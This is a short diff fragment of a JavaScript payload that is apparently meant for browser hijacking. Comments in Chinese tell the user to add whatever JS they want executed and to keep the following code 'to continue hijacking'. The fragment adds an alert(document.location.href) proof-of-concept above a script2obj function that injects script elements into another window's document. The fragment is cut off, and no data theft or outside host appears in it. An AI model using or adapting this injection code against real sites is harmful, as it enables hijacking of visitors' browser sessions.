@@ -1,3 +1,6 @@
+//添加希望执行的JS
+alert(document.location.href);
+//如果希望继续劫持下去,可以添加下面的JS代码，否则删除下面的代码
 //Insert js into obj
 function script2obj(window_obj,src){
 	s=window_obj.document.createElement('script');
